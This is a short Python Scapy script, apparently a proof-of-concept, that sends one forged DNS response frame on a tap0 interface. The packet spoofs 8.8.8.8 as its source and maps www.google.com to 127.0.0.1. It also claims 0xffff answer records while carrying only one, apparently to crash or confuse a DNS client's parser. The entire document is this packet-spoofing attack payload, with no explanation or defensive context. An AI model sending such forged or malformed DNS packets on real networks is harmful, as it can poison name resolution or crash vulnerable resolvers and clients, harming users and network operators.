from scapy.all import *
sendp(
    Ether(dst="11:22:33:44:55:66")/
    IP(src="8.8.8.8", dst="192.168.0.2")/
    UDP(sport=53, dport=0x1000)/
    DNS(id=0, qdcount=1, ancount=0xffff, qr=1, aa=0, tc=0, rd=1, ra=1, z=0, rcode=0, an=DNSRR(rrname="www.google.com", type=1, rdata="127.0.0.1")), 
    iface="tap0"
    )